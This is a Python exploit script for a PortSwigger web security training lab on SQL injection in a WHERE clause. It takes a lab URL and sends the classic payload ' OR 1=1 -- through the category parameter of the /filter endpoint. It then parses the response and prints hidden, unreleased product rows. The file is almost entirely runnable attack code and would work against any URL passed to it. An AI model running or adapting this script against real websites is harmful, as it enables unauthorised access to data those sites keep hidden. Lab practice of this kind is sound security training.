# PortSwigger Lab: SQL Injection vulnerability in WHERE clause allowing retrieval of hidden data
# Author: Grok, Red Team Overlord
# Description: Advanced, modular Python script to exploit SQL injection in PortSwigger Lab 1.
#              Accepts lab URL as input, injects payload to retrieve unreleased products.
# Usage: python sql_injection_lab1_v2.py <lab_url>

import requests
import re
import sys
from urllib.parse import urlparse, parse_qs, urlencode
from typing import List, Dict, Optional

# Constants
LAB_NAME = "SQL Injection - Lab 1: WHERE Clause Vulnerability"
BASE_PAYLOAD = "' OR 1=1 --"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
TIMEOUT = 10
TARGET_ENDPOINT = "/filter"
SUCCESS_PATTERN = r"Congratulations, you solved the lab!"

class SQLiExploiter:
    """Modular class to handle SQL injection exploitation for PortSwigger labs."""

    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        })
        self.parsed_url = urlparse(base_url)
        self.target_endpoint = TARGET_ENDPOINT

    def validate_url(self) -> bool:
        """Validate the provided lab URL with a GET request to handle strict servers."""
        try:
            response = self.session.get(self.base_url, timeout=TIMEOUT, allow_redirects=True)
            if response.status_code in [200, 301, 302]:
                return True
            print(f"[ERROR] URL validation failed. Status code: {response.status_code}")
            return False
        except requests.RequestException as e:
            print(f"[ERROR] URL validation failed: {e}")
            return False

    def craft_injection_url(self) -> str:
        """Craft the SQL injection URL with the payload."""
        query_params = {"category": BASE_PAYLOAD}
        injected_query = urlencode(query_params)
        return f"{self.base_url}{self.target_endpoint}?{injected_query}"

    def exploit(self) -> List[Dict[str, str]]:
        """Execute the SQL injection attack and extract unreleased products."""
        if not self.validate_url():
            print("[ERROR] Invalid lab URL. Exiting.")
            sys.exit(1)

        injection_url = self.craft_injection_url()
        try:
            response = self.session.get(injection_url, timeout=TIMEOUT)
            if response.status_code != 200:
                print(f"[ERROR] Injection failed. Status code: {response.status_code}")
                return []

            # Check for lab solved confirmation
            if re.search(SUCCESS_PATTERN, response.text):
                print("[+] Lab solved! 'Congratulations' message detected.")

            # Extract product data (look for unreleased products)
            product_pattern = re.compile(r'<tr>\s*<td>(.*?)</td>\s*<td>(.*?)</td>\s*<td>(.*?)</td>', re.DOTALL)
            products = []
            for match in product_pattern.finditer(response.text):
                name, description, price = match.groups()
                # Assume unreleased products have distinct markers (e.g., not normally visible)
                products.append({
                    "name": name.strip(),
                    "description": description.strip(),
                    "price": price.strip()
                })

            return products
        except requests.RequestException as e:
            print(f"[ERROR] Exploitation failed: {e}")
            return []

    def report(self, products: List[Dict[str, str]]) -> None:
        """Generate a report of the exploitation results."""
        print(f"\n[+] {LAB_NAME} Exploitation Report")
        print(f"[+] Target URL: {self.base_url}")
        print(f"[+] Injected URL: {self.craft_injection_url()}")
        print(f"[+] Retrieved {len(products)} products (including unreleased):")
        for product in products:
            print(f"    - Name: {product['name']}, Description: {product['description']}, Price: {product['price']}")
        print("[+] Exploitation complete. Check if unreleased products are listed above.")

def main():
    """Main function to orchestrate the attack."""
    print(f"[+] Starting {LAB_NAME} exploitation script...")
    if len(sys.argv) != 2:
        print("[ERROR] Usage: python sql_injection_lab1_v2.py <lab_url>")
        sys.exit(1)

    lab_url = sys.argv[1]
    exploiter = SQLiExploiter(lab_url)
    products = exploiter.exploit()
    exploiter.report(products)

if __name__ == "__main__":
    main()
